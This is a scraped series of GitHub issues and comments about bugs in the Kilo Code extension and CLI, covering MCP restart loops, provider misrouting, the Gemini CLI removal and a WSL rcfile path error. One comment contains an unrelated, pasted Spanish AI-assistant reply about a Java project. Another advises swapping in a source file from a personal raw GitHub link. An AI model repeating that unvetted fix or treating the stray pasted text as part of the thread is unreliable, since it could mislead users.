title: After clicking the Save button in the configuration, the MCP Server restarts repeatedly
body:
### Plugin Type

VSCode Extension

### App Version

Recent versions

### Description

1. I installed MCPs like Codanna and Exa.  
2. Changed some non-MCP settings in the config, then hit Save.  
3. Codanna and Exa started endlessly restarting and couldn’t connect.  
4. But if I manually turn them off, wait a few seconds, then re-enable—no more loop. 

### Reproduction steps

1. I installed MCPs like Codanna and Exa.  
2. Changed some non-MCP settings in the config, then hit Save.  
3. Codanna and Exa started endlessly restarting and couldn’t connect.  
4. But if I manually turn them off, wait a few seconds, then re-enable—no more loop. 

### Provider

_No response_

### Model

_No response_

### System Information

win 11， vscode lastest version， kilocode lastest version。
author: c00134744

comments.author: chenxluo
comments.body: I also have this problem. I think this update from Kilo has caused more bugs than before

comments.author: AlexJ-StL
comments.body:
I have been having the same issue for roughly a week or so. The MCP servers disconnect and reconnect repeatedly. The biggest culprit was the Context 7 server initially, but it has ramped up recently. The last extension update caused other servers to start repeatedly doing it. Now servers like filesystem are disconnecting and reconnecting with near continual frequency.

**Observations:**
1) The phenominon does not occur if I remain on the "MCP Servers" tab.
2) I noticed some odd and new logs for the Filesystem MCP server. I have attached them immediately below (today = 01/30/2026):

- Client does not support MCP Roots, using allowed directories set from server args: [ 'C:\\Users\\my\\folder\\path' ] [today at 12:12 PM]
- Secure MCP Filesystem Server running on stdio [today at 12:12 PM]
- Not connected today at 12:12 PM
- Secure MCP Filesystem Server running on stdio [today at 12:12 PM]

If I notice anything else I will report back to this thread.

OS: Windows 11
IDE: Antigravity (Google's VS Code fork)
Models Used during observations: Kimi K2.5, GLM-4.7, and MiniMax2.1

comments.author: ctsstc
comments.body:
I want to start out with: This is really had to get logs from since they go away and it just keeps doing an auto-restart. It would be nice if logs could stay around without the UI jumping around, so that we could obtain the logs.

---

I have the same problem but maybe for a different reason, but I've found out how to stop it from happening.

With BrowserMCP I've noticed Kilo Code will get it in a reboot loop. 

If there is more than 1 MCP server of it running the new instance kills the old one. 

I think what is happening is that each window of VSCode is trying to boot an instance so they get stuck in a loop of killing each other along with the auto-restart of KiloCode's MCP servers.

Although it's a feature of the MCP server I'm fighting it seems like this is an underlying issue of KiloCode with how MCP servers spawn up if there's more than 1 VSCode window 🤔  At least that's what I'm assuming since the issue goes away if I close other VSCode windows. 

Unfortunately for BrowserMCP this means that you cannot have multiple tools trying to start up the server : ( 

Browser MCP Config for Example:
```json
{
	"browsermcp": {
	  "command": "npx",
	  "args": [
	    "@browsermcp/mcp@latest"
	  ]
	}
}
```

---

I have now been able to repeat this a few times in the last day.

Hopefully this information will help, as I believe it may be relevant. I think that it's likely that you could have an MCP server try to start for each window you have open which could cause some against remote services to throw an error due to your multiple requests potentially, and then you get them stuck in a reboot loop trying to DOS the end point essentially for some of these.

I wonder if the multi VSCode windows is relevant for others? Tonight I had a new remote endpoint act about the same. I often would togg it off, wait for a while, and then try to start it up. But if the endpoint goes down for a moment you get back into each window fighting to re-establish connection to it.

Veo que tienes un proyecto Java Spring Boot para gestión de ubicaciones de clientes (Client Location API) con arquitectura hexagonal. El proyecto incluye:

## Estructura Principal

- **Domain Layer**: Modelos de dominio como [`Location`](src/main/java/com/employbridge/nextgen/client/locations/domain/model/Location.java), [`Address`](src/main/java/com/employbridge/nextgen/client/locations/domain/model/Address.java), [`Market`](src/main/java/com/employbridge/nextgen/client/locations/domain/model/Market.java), etc.
- **Application Layer**: Servicios y casos de uso
- **Adapters**: 
  - Inbound: REST controllers
  - Outbound: Persistencia JPA y clientes externos
- **Tests**: Cobertura completa de pruebas unitarias

## Características Notables

1. Integración con Salesforce
2. Geocodificación de direcciones
3. Gestión de mercados y capacidades
4. Validaciones de dominio robustas
5. Manejo global de excepciones
6. Paginación y ordenamiento

¿En qué puedo ayudarte con este proyecto? ¿Tienes alguna pregunta específica sobre el código, la arquitectura, o necesitas que te explique alguna funcionalidad en particular?"

title: CLI: MODEL_NO_ASSISTANT_MESSAGES with OpenAI-compatible endpoints (intermittent)
body:
## Summary

The Kilocode CLI consistently fails with `MODEL_NO_ASSISTANT_MESSAGES` error when using OpenAI-compatible API endpoints, even though the API works correctly when tested directly with curl.

## Environment

- **OS**: macOS (Darwin 25.2.0)
- **Node.js**: v22.22.0
- **Kilocode CLI**: @kilocode/cli (latest)
- **Extension Version**: 4.148.1

## CLI Configuration

`~/.kilocode/cli/config.json`:
```json
{
  "provider": "default",
  "providers": [{
    "id": "default",
    "provider": "openai",
    "openAiApiKey": "quotio-local-5E4239BB",
    "openAiBaseUrl": "http://127.0.0.1:8317/v1",
    "openAiModelId": "gemini-3-pro-preview",
    "openAiStreamingEnabled": false
  }]
}
```

Note: Streaming has been disabled but the error persists.

## The Problem

The CLI shows this error repeatedly, even with streaming disabled:

```
⏳ API Request retry delayed...
Unexpected API Response: The language model did not provide any assistant messages.

╭───────────────────────────────────────────────────────────────╮
│ ✖ Error                                                       │
│ MODEL_NO_ASSISTANT_MESSAGES                                   │
╰───────────────────────────────────────────────────────────────╯
```

## API Works Correctly When Tested Directly

All of these curl tests return valid responses:

**Simple request:**
```bash
curl http://127.0.0.1:8317/v1/chat/completions \
  -d '{"model": "gemini-3-pro-preview", "messages": [{"role": "user", "content": "Hello"}]}'
# ✅ Returns valid response
```

**Streaming request:**
```bash
curl http://127.0.0.1:8317/v1/chat/completions \
  -d '{"model": "gemini-3-pro-preview", "messages": [...], "stream": true}'
# ✅ Returns valid SSE stream
```

**Request with tools:**
```bash
curl http://127.0.0.1:8317/v1/chat/completions \
  -d '{"model": "gemini-3-pro-preview", "messages": [...], "tools": [...]}'
# ✅ Returns valid response with content
```

## Code Analysis

**Non-streaming path (lines 267-304):**
The code always yields a text chunk on line 298-301:
```typescript
yield {
    type: "text",
    text: message?.content || "",
}
```

This should always produce output, even with empty content.

**Provider config mapping (cli/src/config/mapper.ts):**
The `mapProviderToApiConfig` function correctly passes through all provider fields including `openAiStreamingEnabled`.

## Possible Causes

Since the API works correctly when tested directly, the issue must be in how the CLI:
1. **Constructs the request** - The system prompt might be too long or contain problematic characters
2. **Sends the request** - There might be a timeout or connection issue with the OpenAI SDK
3. **Parses the response** - Something in the response structure might not match expectations
4. **Processes the generator** - The ApiStream generator might not be consumed correctly

## Key Observation

The CLI is using "Orchestrator" mode and YOLO mode. The request includes:
- A complex orchestrator system prompt
- Multiple tools definition
- Possibly large context

The API might be:
- Timing out on the large request
- Returning an error that's being silently swallowed
- Failing to parse the complex system prompt

## Suggested Investigation

1. Add debug logging before and after the `this.client.chat.completions.create()` call in `openai.ts`
2. Log the exact request being sent and response received
3. Check if the request is reaching the API endpoint at all
4. Verify the response has the expected structure before yielding

## Request

Please add verbose logging for OpenAI-compatible endpoints to help diagnose this issue.

title: New "Review" Role launches scope selector when the role is passed to by another sub-agent.
body:
### Plugin Type

VSCode Extension

### App Version

5.0.0

### Description

New "Review" Role launches scope selector when the role is passed to by another sub-agent. 

The intent I imagine is when a user selects it manually, you then select the scope that you want the review to apply to. However, this means that the agent will get stuck if it ever looks like that this agent is callable by other sub-agents. So whenever the review agent is called by another sub-agent, it will halt until there's user intervention. 

### Reproduction steps

From the orchestrator, ask it to launch the review subagent. It will halt immediately, and you'll have to select the review scope.

### Provider

_No response_

### Model

_No response_

### System Information

_No response_

title: Gemini CLI removed
body:
Kilo code removes the Gemini CLI options from the providers list in the latest version 5.1.0; please bring it back. 
Gemini CLI supports images and Google's most capable models like Gemini 3, with a massive 1M context window, whereas most of the other free options do not support images. 

Please, bring gemini cli  provider option back.
author: EHMilon

comments.author: ArkBee
comments.body:
Issue #5372  was opened by several days ago and #5086 . This was supposed to be fixed. Why remove something that people are actually using?
I find Kilo way more user-friendly than the Google CLI. The main reason I ditched CLine for Kilo was this exact provider.

comments.author: lambertjosh
comments.body: @EHMilon - apologies for the inconvenience, support was removed intentionally as using the Gemini CLI is not a Google supported method of integration. If another mechanism becomes supported for third parties, we will be happy to integrate. We do offer support for ChatGPT, Z.ai, and other providers' subscriptions. We also have just launched anonymous access today to a number of free models.

> [@EHMilon](https://github.com/EHMilon)Pedimos desculpas pelo inconveniente. O suporte foi removido intencionalmente, pois o uso da CLI do Gemini não é um método de integração suportado pelo Google. Se outro mecanismo for compatível com terceiros, teremos prazer em integrá-lo. Oferecemos suporte para assinaturas do ChatGPT, Z.ai e outros provedores. Também lançamos hoje o acesso anônimo a diversos modelos gratuitos.

comments.author: SALhik
comments.body:
## Root Cause Analysis for “Failed to load OAuth credentials” in Gemini CLI

Thanks for raising this — I’ve traced the root cause of this issue and can confirm it **is not** a problem with users’ OAuth credentials or local auth files, but a **breaking backend change combined with outdated client logic in Kilo Code**.

---

## What’s Actually Failing

The error:

```

Failed to load OAuth credentials. Please authenticate first:
Error: OAuth client credentials not found in config

````

comes from this code path in the legacy **Gemini CLI integration**:

```ts
await this.fetchOAuthConfig()
````

That function tries to fetch:

```
https://api.kilo.ai/extension-config.json
```

If the endpoint returns anything other than a valid JSON with:

```json
{
  "geminiCli": {
    "oauthClientId": "...",
    "oauthClientSecret": "..."
  }
}
```

the client will throw:

```ts
new Error("OAuth client credentials not found in config")
```

and that is then wrapped and displayed as a misleading “Failed to load OAuth credentials” error.

---

## The Real Cause: Missing Backend Config

When I open:

```
https://api.kilo.ai/extension-config.json
```

in the browser, I get **404 Not Found**.

That 404 is *all that’s needed* to break this code path. Because:

1. The legacy Gemini CLI code expects that endpoint to exist.
2. It expects it to contain a `geminiCli.oauthClientId` and `oauthClientSecret`.
3. It throws before it even reads the user’s local OAuth creds.

This explains why users who have valid `oauth_creds.json` still hit the error.

---

## Why This Happened

* The function `getExtensionConfigUrl()` has been removed from the current Roo Code repo.
* It appears that the backend endpoint `extension-config.json` was deleted or deprecated.
* Classic case: **a backend breaking change + no client compatibility guard**.
* The code still runs in older versions of Kilo Code, so all old installations instantly fail once the backend stopped serving it.

This is why:

* Users are suddenly encountering this even though they had working setups.
* Re-authenticating / refreshing tokens does nothing because the failure happens *before* loading credentials.

---

## Why This Error Message Is Misleading

The UI shows:

```
Failed to load OAuth credentials. Please authenticate first.
```

But actual problem is:

```
OAuth client configuration could not be fetched from the backend.
```

Those are *not* the same thing — but the error is masked by poor error handling.

---

## What Needs to Be Fixed

There are a few potential fixes:

### Short-term / Patch

* **Skip the `fetchOAuthConfig()` call** if the local credential file already exists.
* Or **fallback gracefully** when the config endpoint returns 404.

Suggested behavior:

```ts
if (response.status === 404) {
  // ignore and proceed with local creds
}
```

### Medium / Permanent

* Update the Gemini CLI provider to embed the OAuth client ID/secret statically (or via environment), instead of fetching a backend JSON that no longer exists.

### Recommended Change

* Replace the `axios` call with a safer fetch that handles missing endpoints and returns a clear warning instead of a fatal error.
* Don’t throw `oauthLoadFailed` just because the config endpoint is gone.

---

## Why This Affects Only Gemini CLI Users

* Other providers in Kilo Code do not use `getExtensionConfigUrl()`.
* The function has been removed in the latest repo (which means the server endpoint also had no remaining clients).
* Only older versions that still bundle Gemini CLI execute this code.

---

## Evidence

* 404 confirmed: `https://api.kilo.ai/extension-config.json`
* Local OAuth creds are valid and would work if the fetch were skipped
* Repo no longer defines `getExtensionConfigUrl()` in the latest code

---

## Conclusion

This isn’t a credentials issue — it’s a **dead backend dependency** in legacy code.
Once the server stopped hosting `extension-config.json`, **all old Gemini CLI integrations instantly started failing**.

Fixing this requires either:

* removing that dependency entirely, or
* adding robust fallback logic.

Happy to help draft a patch if needed!

comments.author: SALhik
comments.body:
I’ve found a working patch for this issue.

### Fix
Replace `gemini-cli.ts` located at:
```
/src/api/providers/gemini-cli.ts
```

with the following version:
- https://raw.githubusercontent.com/SALhik/SALhik/refs/heads/main/gemini-cli.ts

### Why this works
This patched file removes the dependency on fetching `extension-config.json` (which now returns 404) and avoids the broken OAuth config lookup that causes:
```
Failed to load OAuth credentials. Please authenticate first:
OAuth client credentials not found in config
```

### Steps
1. Replace the file at  
   `/src/api/providers/gemini-cli.ts`
2. Rebuild / repackage Kilo Code
   - VS Code: rebuild the extension
   - JetBrains: rebuild the plugin bundle
3. Reinstall the rebuilt extension/plugin

After this, Gemini CLI works again without being blocked by the missing `extension-config.json`.

### Notes
- This is a patch/workaround, not an upstream fix.
- Existing OAuth tokens may still need to be regenerated if the client ID has changed.

Hope this helps others who are stuck on this error.

comments.author: SALhik
comments.body:
If you don't know how to rebuild kilo code, follow these steps. 

### Prerequisites
Ensure you have [pnpm](https://pnpm.io/installation) installed.

### Build Instructions
Run the following commands from the root of the project:

```bash
# 1. Install dependencies and prepare the environment
pnpm install:vsix

# 2. Build the VS Code Extension (.vsix)
pnpm vsix:production

# 3. (Optional) Build the JetBrains version
pnpm jetbrains:bundle

# 4. (Optional) Build the CLI version
pnpm cli:bundle
```

**Output:** 
The generated `.vsix` extension and other build artifacts will be located in the `/bin` directory.

Thanks for your work on the project!

author: Kashinathpat

title: Clarification on the Relationship, Background, and Future Plans of Two CLI Projects
body:
### Question

Hi Kilo-Org team! 👋

First off, thank you for building such powerful agentic engineering tools—Kilo Code has been incredibly helpful for streamlining development workflows.

While exploring your GitHub repositories, I noticed two projects that both appear to implement CLI functionality for Kilo Code:
1. [kilocode/cli](https://github.com/Kilo-Org/kilocode/tree/main/cli) (under the `kilocode` repo, within the `cli` directory)
2. [kilo-cli](https://github.com/Kilo-Org/kilo-cli) (a standalone `kilo-cli` repo)

Both projects seem active with recent commits , which has left me curious about their exact relationship and roadmap. I’d greatly appreciate it if you could clarify the following:

### Questions:
1. **Relationship**: Are these two projects separate implementations, forks, or is one a successor/predecessor of the other? Do they serve different use cases or target different environments?
2. **Background**: What led to the creation of two distinct CLI projects? Were there specific technical or product decisions that motivated this structure?
3. **Future Plans**: Will both projects continue to be maintained, or is there a plan to consolidate them into a single CLI tool? If consolidation is planned, which repository will be the primary one moving forward?
4. **Usage Guidance**: For new users looking to adopt Kilo Code CLI, which project should we prioritize? Are there any functional differences we should be aware of when choosing between them?

Thank you for taking the time to address these questions—it will help the community make informed decisions about integrating Kilo Code into our workflows.

Looking forward to your response!

Best regards.
author: shreychen

comments.author: stmichaelis
comments.body:
Same question here, absolutely confused. Stumbled upon this after the CLI notified about a version upgrade with a huge jump from 0.26.1 to 1.0.13 (at the time). Seems like this is the successor? 

After upgrading, kilo CLI stopped working with a black screen on Windows WSL2. As a fork of OpenCode, this could be the same problem they are fighting with over there. But I am wondering if this version even uses the same configuration as the original CLI?

comments.author: pschiel
comments.body:
> After upgrading, kilo CLI stopped working with a black screen on Windows WSL2

try this to eliminate possible problems:

- Deactivate `timesyncd`. Otherwise HyperV will do hard time resets, which leads to freezes and corrupt timestamps.

```bash
sudo systemctl stop systemd-timesyncd
sudo systemctl disable systemd-timesyncd
```

- Disable `appendWindowsPath` in `/etc/wsl.conf`

```
[interop]
appendWindowsPath = false
```

- Cleanup

```bash
npm cache clean --force
rm -rf $HOME/.bun/install/cache
rm -rf $HOME/.local/state/kilo
rm -rf $HOME/.local/share/kilo/bin
rm -rf $HOME/.cache/kilo
rm -rf $HOME/.config/kilo/node_modules
```

- Remove all plugins (plugins auto-update during start)

comments.author: stmichaelis
comments.body:
Thanks for the quick reply. Works now. I did not check what exactly helped, as I intend to revert the changes some versions from now on to get back to a standard configuration and see if an update fixes this as well. Also applied the workaround disabling IPv6 in ~/.wslconfig as
```
[wsl2]
kernelCommandLine=ipv6.disable=1
```

comments.author: BeWater799
comments.body: Kilo Code failed to preserve and propagate the reasoning_content field required by Kimi K2.5/K2-Thinking models in multi-step agent workflows. According to Moonshot AI's official documentation, when using kimi-k2.5 or kimi-k2-thinking with thinking mode enabled (particularly during multi-step tool calling), the API requires the client to preserve the reasoning_content field from the assistant message in the previous turn and include it in the subsequent request's message context. Official specification states: "During multi-step tool calling, you must keep the reasoning_content from the assistant message in the current turn's tool call within the context, otherwise an error will be thrown." "Input should include the entire reasoning content from the context (the reasoning_content field) in your input. The model will decide which parts are necessary and forward them for further reasoning." Currently, Kilo Code appears to only extract the content field from assistant responses while discarding the reasoning_content field. This causes: API errors (likely "reasoning_content required" or context validation errors) in multi-step tool calling scenarios Loss of reasoning continuity across agent iterations Expected behavior: The agent should capture the reasoning_content field from each assistant response (accessible via hasattr/getattr checks in OpenAI SDK compatibility mode) and include it in the next request's message payload alongside the standard content and role fields. now it seems fixed

title: WSL terminal doesn't load user's shell configuration (bashrc) due to Windows path in --rcfile
body:
## Plugin Type

JetBrains Plugin

## App Version

4.150.0

## Description

When using Kilocode with IntelliJ IDEA on WSL (Windows Subsystem for Linux), the terminal doesn't load the user's shell configuration (`~/.bashrc`), resulting in:

- Missing PATH entries (tools like `fnm`, `pyenv`, `mise`, `claude` not available)
- No colored prompt
- Missing aliases and environment setup

Disabling the Kilocode plugin resolves the issue.

## Reproduction Steps

1. **Setup:**
   - Windows with WSL2 installed (e.g., Ubuntu 24.04)
   - IntelliJ IDEA (any JetBrains IDE) installed on Windows
   - Kilocode plugin installed and enabled
   - Project opened from a WSL path (IntelliJ connects to WSL via ijent) 
   - Shell Integration enabled (Settings → Tools → Terminal → "Shell integration" checked)

2. **Ensure your `~/.bashrc` has visible side effects**, e.g.:
   ```bash
   # Add to ~/.bashrc if not already present
   export MY_TEST_VAR="bashrc_loaded"
   alias ll='ls -la'
   ```

3. **Open a new terminal** (Alt+F12 or View → Tool Windows → Terminal)

4. **Verify the bug:**
   ```bash
   # This will be empty - bashrc wasn't sourced
   echo $MY_TEST_VAR

   # This will fail - alias not defined
   ll
   ```

5. **Verify it's Kilocode-specific:**
   - Disable Kilocode plugin (Settings → Plugins → Kilocode → Disable)
   - Restart IntelliJ
   - Open terminal again
   - Run the same checks - they should now work

6. **Alternative verification - Shell Integration setting:**
   - Re-enable Kilocode plugin
   - Go to Settings → Tools → Terminal
   - Uncheck "Shell integration"
   - Restart terminal
   - The bug is also resolved (bashrc loads correctly)

   This confirms the issue is specifically in how Kilocode's shell integration interacts with WSL terminals, not Kilocode in general.

## Expected Behavior

The terminal should load the user's `~/.bashrc` (or `ORIGINAL_BASH_RCFILE` if set by JetBrains integration), preserving:

- PATH modifications
- Environment variables
- Aliases
- Prompt customization (PS1)

## Actual Behavior

User's shell configuration is not loaded. The terminal starts with a minimal environment missing all user customizations.

## System Information

- **OS:** Windows 11 with WSL2
- **WSL Distribution:** Ubuntu 24.04
- **IDE:** IntelliJ IDEA 2024.3.4
- **Kilocode Version:** 4.150.0
- **Shell:** bash 5.2.21
- **Terminal connects via:** ijent (IntelliJ's WSL agent)
author: maxkoretskyi

comments.author: maxkoretskyi
comments.body:
I dug into the code and found the issue. In [WeCoderTerminalCustomizer.kt](https://github.com/Kilo-Org/kilocode/blob/3938be9ac36c2ba797f0180a5ed661dea4709592/jetbrains/plugin/src/main/kotlin/ai/kilocode/jetbrains/terminal/WeCoderTerminalCustomizer.kt#L24), the `shellIntegrationBaseDir` is built using `System.getProperty("user.home")` which returns the Windows home directory (e.g., `C:\Users\username`). This path is [then passed](https://github.com/Kilo-Org/kilocode/blob/3938be9ac36c2ba797f0180a5ed661dea4709592/jetbrains/plugin/src/main/kotlin/ai/kilocode/jetbrains/terminal/WeCoderTerminalCustomizer.kt#L279) to bash via `--rcfile`:

```kotlin
// Lines 23-24: Base directory uses Windows home
private val shellIntegrationBaseDir: String by lazy {
    val userHome = System.getProperty("user.home")  // Returns C:\Users\username on Windows
    ...
}

// Line 279: Bash script path built from this
Paths.get(shellIntegrationBaseDir, "vscode-bash", "bashrc").toString()
```

This results in a Windows path being passed to bash via `--rcfile`. 

```
/bin/bash --rcfile C:\Users\username\.kilocode-shell-integrations\vscode-bash\bashrc -i    
```

I confirmed by checking the actual command in the WSL terminal:

```bash
$ cat /proc/$$/cmdline | tr '\0' '\n'
/bin/bash
--rcfile
C:\Users\username\.kilocode-shell-integrations\vscode-bash\bashrc
-i
```

I confirmed this by checking the actual command in the WSL terminal:

```bash
$ cat /proc/$$/cmdline | tr '\0' '\n'
/bin/bash
--rcfile
C:\Users\username\.kilocode-shell-integrations\vscode-bash\bashrc
-i
```

The problem is that bash running in WSL can't read Windows paths like `C:\Users\...`. It needs the Linux-style path `/mnt/c/Users/...`. Since bash can't find the file, the Kilocode bashrc never runs, and the user's bashrc never gets sourced.

I confirmed this by checking from the WSL terminal:
```bash
cat 'C:\Users\username\.kilocode-shell-integrations\vscode-bash\bashrc'
# No such file or directory

cat /mnt/c/Users/username/.kilocode-shell-integrations/vscode-bash/bashrc
# Works fine
```

To fix this, we need to detect WSL and convert the path. In `injectBashScript()`, check if the terminal is WSL and convert `C:\Users\...` to `/mnt/c/Users/...`. Could use the `wslpath` utility or manual string replacement.

I created a [PR](https://github.com/Kilo-Org/kilocode/pull/5413)

title: MCP management design is unreasonable
body:
### Plugin Type

VSCode Extension

### App Version

v4.153.0

### Description

After MCP Service Management is moved to the secondary menu of the settings page, the MCP server will be refreshed and restarted every time the settings are saved, causing repeated loading and slowing down.And when the MCP service is abnormal, it will always try to restart indefinitely

### Reproduction steps

If you do not change the MCP settings, if you change any of the settings and click Save, the MCP server will be automatically refreshed.

### Provider

_No response_

### Model

_No response_

### System Information

_No response_

title: OAuth app with client id https://kilocode.ai/.well-known/oauth-client/vscode-extension.json doesn't exist
body:
### Plugin Type

VSCode Extension

### App Version

Version: 4.152.0 (0fae2bf8)

### Description

Trying to oauth into Figma shows the following error:

## URL

- <https://www.figma.com/oauth/mcp?client_id=https://kilocode.ai/.well-known/oauth-client/vscode-extension.json&response_type=code&code_challenge=XXXXX&code_challenge_method=S256&redirect_uri=http://127.0.0.1:53155/&state=XXXXX&scope=mcp:connect>

## Error

```
OAuth app with client id https://kilocode.ai/.well-known/oauth-client/vscode-extension.json doesn't exist
```

### Reproduction steps

## `mcp_settings.json`

```json
{
    "figma": {
      "type": "streamable-http",
      "url": "https://mcp.figma.com/mcp",
      "disabled": false,
      "alwaysAllow": []
    }
  }
}
```

### Provider

_No response_

### Model

_No response_

### System Information

_No response_
author: ctsstc

comments.author: emilieschario
comments.body: Hey there @ctsstc - Figma doesn't work with open MCP standards. They require apps to be whitelisted by Figma. We've submitted the request and are waiting to hear from them. Thanks!

comments.author: ctsstc
comments.body:
Dang that's unfortunate, but understandable. Hopefully they end up whitelisting Kilo :) 
Thanks for the update.

If there's anywhere we can help show support/demand/need for this request let us know. It's probably just a waiting game for now.

title: ZAI Provider Not Working - Always Falls Back to Default Provider
body:
### Plugin Type

Kilo Code CLI

### App Version

0.25.0

### Description

# Bug Report: ZAI Provider Not Working - Always Falls Back to Default Provider

## Environment

- **Kilocode CLI Version**: 0.25.0
- **OS**: Linux 5.15.0-164-generic
- **Node Version**: v20.20.0
- **Installation Method**: npm global install

## Description

The ZAI provider configuration is ignored by kilocode CLI. Even when explicitly set as the default provider in the config file or specified via the `-P` flag, kilocode continues to use the "default" provider (kilocode with deepseek-r1 model) instead of the configured ZAI provider.

## Configuration

**Config file location**: `~/.kilocode/cli/config.json`

```json
{
  "version": "1.0.0",
  "mode": "code",
  "telemetry": true,
  "provider": "zaiprime",
  "providers": [
    {
      "id": "default",
      "provider": "kilocode",
      "kilocodeToken": "secret",
      "kilocodeModel": "deepseek/deepseek-r1"
    },
    {
      "id": "zaiprime",
      "provider": "zai",
      "zaiApiKey": "secret",
      "zaiApiLine": "international_coding",
      "apiModelId": "glm-4.7",
      "embeddings": {
        "provider": "local"
      }
    }
  ]
}
```

## Expected Behavior

When `"provider": "zaiprime"` is set in the config or when using `-P zaiprime` flag, kilocode should:
- Connect to the ZAI API endpoint (`https://api.z.ai/api/coding/paas/v4`)
- Use the configured model `glm-4.7`
- Display model information consistent with ZAI provider

## Actual Behavior

- Kilocode ignores the ZAI provider configuration
- Always falls back to the "default" provider (kilocode/deepseek-r1)
- The model response confirms it's using `deepseek/deepseek-r1`
- No error messages are displayed about ZAI provider failure

### Critical Finding: UI Shows Wrong Provider Status

When using the interactive mode, kilocode **falsely reports** that the ZAI provider is active:

**Running `/provider list` shows:**
```
ℹ   Configured Providers:

    default
     Type: Kilo Code
     Model: deepseek/deepseek-r1

  ⭐ zaiprime (current)
     Type: Zai
     Model: glm-4.7

    Total: 2 providers
```

**Running `/provider select zaiprime` confirms:**
```
ℹ   Switched to zaiprime
    Type: Zai
    Model: glm-4.7
```

**BUT the status bar shows the REAL provider being used:**
```
Code | DeepSeek: R1 | 0%
```

**This confirms:**
1. The UI incorrectly displays zaiprime as the active provider
2. The actual API calls are still going to DeepSeek R1 (default provider)
3. The provider switching mechanism is completely broken - it updates the UI state but not the actual model backend

## Additional Information

### Testing with /profile command

When running `/profile`:
- With default provider (kilocode): Shows profile information (Name: MyProfile, Balance: $XX.XX)
- With `-P zaiprime` flag: Returns error "Profile command requires Kilocode provider"

This suggests the ZAI provider is recognized but not actually activated.

### Related Issues

Similar issues reported in the repository:
- **#4706**: CLI - Not able to switch models when using other providers (VERY SIMILAR - same UI/backend disconnect)
- #3761: CLI hangs at Thinking; does not use provider at all
- #3828: Set up fails many times during z.ai setup
- #3228: Cli Zai authentication doesn't work
- #4636: Cannot choose glm 4.7 in z.ai provider

**Note**: Issue #4706 reports a similar UI/backend disconnect where `/model select` appears to work but the actual model doesn't change. Our issue extends this finding to show the problem exists at the provider level as well.

### ZAI Provider Configuration Validation

According to the [official documentation](https://github.com/Kilo-Org/kilocode/blob/main/cli/docs/PROVIDER_CONFIGURATION.md), the ZAI provider requires:
- ✅ `zaiApiKey`: Configured
- ✅ `zaiApiLine`: Set to `international_coding` (valid option)
- ✅ `apiModelId`: Set to `glm-4.7`

All required fields are present and correctly formatted.

### No Error Logs

Checked `~/.kilocode/cli/logs/cli.txt` - no error messages related to ZAI provider initialization or API connection failures.

## Impact

Users cannot use their ZAI API credits and are forced to use the kilocode provider even when explicitly configuring ZAI as their provider.

## Possible Causes

Based on the UI/backend disconnect observed:

1. **UI State vs Backend State Mismatch**: The provider selection updates the UI state (what `/provider list` shows and the status messages) but fails to update the actual model backend that handles API calls
2. **Provider Initialization Failure**: The ZAI provider may fail to initialize silently, causing a fallback to the default provider while the UI still shows ZAI as selected
3. **Missing ZAI Provider Module**: The ZAI provider implementation may be missing, incomplete, or not properly loaded in version 0.25.0
4. **Model Backend Hardcoded**: The actual model/API endpoint selection may be hardcoded or cached somewhere that doesn't respect the provider configuration

## Workaround Attempted

None successful. The ZAI provider simply cannot be activated in the current version.

### Reproduction steps

## Steps to Reproduce

1. Configure a ZAI provider in `~/.kilocode/cli/config.json` with valid credentials
2. Set `"provider": "zaiprime"` as the default provider (line 5 in config)
3. Run `kilocode --auto "What model are you using?"`
4. Observe that the response indicates `deepseek/deepseek-r1` instead of `glm-4.7`

**Alternative reproduction (interactive mode - clearest demonstration of the bug):**
1. Launch interactive mode: `kilocode`
2. Run `/provider list` - observe that "zaiprime" shows as "(current)"
3. Check the status bar at bottom-right - shows "DeepSeek: R1"
4. Run `/provider select zaiprime` - message confirms "Switched to zaiprime"
5. Check the status bar again - **STILL shows "DeepSeek: R1"**
6. Send any message to the assistant - responses confirm it's using deepseek-r1

This clearly demonstrates that the provider switching UI updates but the actual backend model remains unchanged.

**Command-line reproduction:**
1. Keep default provider as "default"
2. Run `kilocode -P zaiprime --auto "What model are you using?"`
3. Same result: still uses deepseek-r1

### Provider

Kilo Code

### Model

DeepSeek R1

### System Information

# Environment

- **Kilocode CLI Version**: 0.25.0
- **OS**: Linux 5.15.0-164-generic
- **Node Version**: v20.20.0
- **Installation Method**: npm global install

cat /etc/linuxmint/info 
RELEASE=21.3
CODENAME=virginia
EDITION="Cinnamon"
DESCRIPTION="Linux Mint 21.3 Virginia"
DESKTOP=Gnome
TOOLKIT=GTK
NEW_FEATURES_URL=https://www.linuxmint.com/rel_virginia_whatsnew.php
RELEASE_NOTES_URL=https://www.linuxmint.com/rel_virginia.php
USER_GUIDE_URL=https://www.linuxmint.com/documentation.php
GRUB_TITLE=Linux Mint 21.3 Cinnamon

title: Vertex AI Support Broken for All Third-Party Models (Llama, DeepSeek, Qwen, etc.)
body:
### Plugin Type

JetBrains Plugin

### App Version

4.145.0

### Description

Vertex AI support in Kilocode is currently incomplete and broken for Model-as-a-Service (MaaS) models from third-party providers (Meta Llama, DeepSeek, Qwen, Moonshot AI, etc.). While the codebase has stubs for these models, they fail at runtime due to incorrect API endpoint construction and missing provider routing logic.

## Background

Google Cloud Vertex AI offers two categories of models:

1. **Google native models** (Gemini family) - Currently working
2. **Model-as-a-Service (MaaS)** from third-party providers - Currently broken:
   - Meta Llama 4 (Maverick, Scout)
   - DeepSeek (V3.2, R1)
   - Qwen (Coder, Next, etc.)
   - Moonshot AI (Kimi K2)
   - MiniMax M2
   - OpenAI GPT-OSS
   - ZAI.org (GLM-4.7)

## Current Issues

### 1. Incorrect URL Construction

The existing Vertex AI implementation assumes all models use the Gemini API format:
```
https://{region}-aiplatform.googleapis.com/v1/projects/{project}/locations/{region}/publishers/google/models/{model}:streamGenerateContent
```

However, MaaS models require **OpenAI-compatible Chat Completions endpoints**:
```
https://{region}-aiplatform.googleapis.com/v1/projects/{project}/locations/{region}/endpoints/openapi/chat/completions
```

### 2. Missing Provider Routing

The codebase defines `vertexPublisher` fields (meta, deepseek-ai, qwen, moonshotai, etc.) but never uses them to route requests to the correct API surface.

### 3. Request Format Mismatch

MaaS models expect OpenAI-compatible request payloads with the model specified as `{publisher}/{model-id}`:
```json
{
  "model": "deepseek-ai/deepseek-v3.2-maas",
  "messages": [...],
  "stream": true
}
```

Current implementation sends Gemini-formatted requests which are rejected by the MaaS endpoints.

### 4. Authentication Scope

MaaS models **only support OAuth2/Service Account authentication** (keyFile or JSON credentials). Unlike some other providers, there is no API key option for Vertex AI MaaS.

## Impact

**Developers cannot use any third-party models through Vertex AI**, despite these models being:
- Listed in the model configuration (`packages/types/src/providers/vertex.ts`)
